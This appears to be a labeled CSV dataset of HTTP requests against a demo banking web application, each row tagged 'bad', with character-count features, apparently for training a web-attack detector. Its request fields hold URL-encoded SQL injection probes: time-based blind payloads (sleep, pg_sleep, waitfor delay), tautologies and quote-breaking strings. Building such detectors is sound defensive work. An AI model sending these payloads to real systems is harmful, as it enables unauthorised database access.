,method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
336,POST,b'cfile=comments.txt&comments=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
337,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%20and%20sleep%284%29%3d%22',b'/doSubscribe',0,2,0,1,2,1,bad
338,POST,b'btnSubmit=Login&passw=acUn3t1x%27%20and%20sleep%284%29%3d%27&uid=1',b'/doLogin',2,0,0,1,2,2,bad
339,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058-56%20%3d%202',0,0,0,0,4,0,bad
340,GET,b'',b'/swagger/index%22%3dsleep%284%29%3d%22.html',0,2,0,1,0,1,bad
341,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
342,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%bf%27%bf%22&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
343,GET,b'',b'/index.jsp?content=JyI%3d',0,0,0,0,0,0,bad
344,GET,b'',b'/index.jsp?content=-1%22%20or%2025-23%20%3d%20%222',0,2,0,0,4,0,bad
345,POST,b'cfile=comments.txt&comments=1%27%20and%20sleep%284%29%3d%27&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
346,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',1,0,1,2,6,1,bad
347,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%20%2719%27%3d%2719',4,0,0,0,2,0,bad
348,GET,b'',b'/swagger/index%20and%20sleep%284%29%20.html',0,0,0,1,3,1,bad
349,POST,b'btnSubmit=Login&passw=acUn3t1x%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',1,0,1,2,6,2,bad
350,GET,b'',b'/default.jsp?content=-1%20or%2032%3d32',0,0,0,0,2,0,bad
351,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%40%40VprZK',0,0,0,0,0,0,bad
352,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%f0%27%27%f0%22%22&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
353,GET,b'',b'/index.jsp?content=%bf%27%bf%22',1,1,0,0,0,0,bad
354,GET,b'',b'/index.jsp?content=personal_loans.htm%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
355,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',0,1,1,2,6,1,bad
356,POST,b'cfile=comments.txt&comments=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
357,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%20%2719%27%3d%270',4,0,0,0,2,0,bad
358,GET,b'',b'/swagger/index%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',0,0,1,2,6,1,bad
359,GET,b'',b'/default.jsp?content=-1%20or%2032%3d0',0,0,0,0,2,0,bad
360,POST,b'btnSubmit=Login&passw=acUn3t1x%22%20and%20sleep%284%29%3d%22&uid=1',b'/doLogin',0,2,0,1,2,2,bad
361,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=JyI%3d',0,0,0,0,0,0,bad
362,GET,b'',b'/index.jsp?content=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
363,GET,b'',b'/index.jsp?content=personal_loans.htm%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
364,POST,b'cfile=comments.txt&comments=1%22%20and%20sleep%284%29%3d%22&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
365,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3dsleep%284%29%3d%27',b'/doSubscribe',2,0,0,1,0,1,bad
366,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%2019-17%20%3d%20%272',2,0,0,0,4,0,bad
367,GET,b'',b'/swagger/index%27%3bselect%20pg_sleep%284%29%3b%20--%20.html',1,0,1,1,3,2,bad
368,GET,b'',b'/default.jsp?content=-1%27%20or%20%2745%27%3d%2745',4,0,0,0,2,0,bad
369,POST,b'btnSubmit=Login&passw=acUn3t1x%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',1,0,1,2,6,2,bad
370,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%bf%27%bf%22',1,1,0,0,0,0,bad
371,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1%27%22&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
372,GET,b'',b'/index.jsp?content=personal_loans.htm%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
373,GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
374,POST,b'cfile=comments.txt&comments=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
375,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%3dsleep%284%29%3d%22',b'/doSubscribe',0,2,0,1,0,1,bad
376,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%20%2283%22%3d%2283',0,4,0,0,2,0,bad
377,GET,b'',b'/swagger/index%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.html',3,0,1,0,5,2,bad
378,POST,b'btnSubmit=Login&passw=acUn3t1x%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',0,1,1,2,6,2,bad
379,GET,b'',b'/default.jsp?content=-1%27%20or%20%2745%27%3d%270',4,0,0,0,2,0,bad
380,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
381,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%5c&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
382,GET,b'',b'/default.jsp?content=1%27%22',1,1,0,0,0,0,bad
383,GET,b'',b'/index.jsp?content=personal_loans.htm%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
384,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20and%20sleep%284%29%20',b'/doSubscribe',0,0,0,1,3,1,bad
385,POST,b'cfile=comments.txt&comments=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
386,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%20%2283%22%3d%220',0,4,0,0,2,0,bad
387,GET,b'',b'/swagger/index%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.html',2,1,1,0,5,2,bad
388,POST,b'btnSubmit=Login&passw=acUn3t1x%27%3dsleep%284%29%3d%27&uid=1',b'/doLogin',2,0,0,1,0,2,bad
389,GET,b'',b'/default.jsp?content=-1%22%20or%20%2296%22%3d%2296',0,4,0,0,2,0,bad
390,GET,b'',b'/',0,0,0,0,0,0,bad
391,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1%c0%00xa7%c0%a2&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
392,GET,b'',b'/index.jsp?content=personal_loans.htm%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
393,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',0,0,1,2,6,1,bad
394,POST,b'cfile=comments.txt&comments=1%27%3dsleep%284%29%3d%27&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
395,GET,b'',b'/',0,0,0,0,0,0,bad
396,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%2083-81%20%3d%20%222',0,2,0,0,4,0,bad
397,GET,b'',b'/default.jsp?content=%5c',0,0,0,0,0,0,bad
398,POST,b'btnSubmit=Login&passw=acUn3t1x%22%3dsleep%284%29%3d%22&uid=1',b'/doLogin',0,2,0,1,0,2,bad
399,GET,b'',b'/default.jsp?content=-1%22%20or%20%2296%22%3d%220',0,4,0,0,2,0,bad
400,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%40%40uooCt&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
401,POST,b'cfile=comments.txt&comments=1%22%3dsleep%284%29%3d%22&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
402,GET,b'',b'/index.jsp?content=personal_loans.htm%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
403,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3bselect%20pg_sleep%284%29%3b%20--%20',b'/doSubscribe',1,0,1,1,3,2,bad
404,GET,b'',b'/',0,0,0,0,0,0,bad
405,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
406,GET,b'',b'/default.jsp?content=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
407,POST,b'btnSubmit=Login&passw=acUn3t1x%20and%20sleep%284%29%20&uid=1',b'/doLogin',0,0,0,1,3,2,bad
408,GET,b'',b'/default.jsp?content=security.htm%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
409,GET,b'',b'/',0,0,0,0,0,0,bad
410,POST,b'cfile=comments.txt&comments=1%3bselect%20pg_sleep%284%29%3b%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,1,5,2,bad
411,GET,b'',b'/index.jsp?content=personal_loans.htm%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
412,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=JyI%3d&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
413,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',b'/doSubscribe',3,0,1,0,5,2,bad
414,GET,b'',b'/',0,0,0,0,0,0,bad
415,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
416,GET,b'',b'/default.jsp?content=%40%40Va505',0,0,0,0,0,0,bad
417,POST,b'btnSubmit=Login&passw=acUn3t1x%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',0,0,1,2,6,2,bad
418,GET,b'',b'/default.jsp?content=security.htm%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
419,GET,b'',b'/',0,0,0,0,0,0,bad
420,POST,b'cfile=comments.txt&comments=1%27%3bselect%20pg_sleep%284%29%3b%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
421,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%bf%27%bf%22&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
422,GET,b'',b'/index.jsp?content=personal_loans.htm%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
423,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',b'/doSubscribe',2,1,1,0,5,2,bad
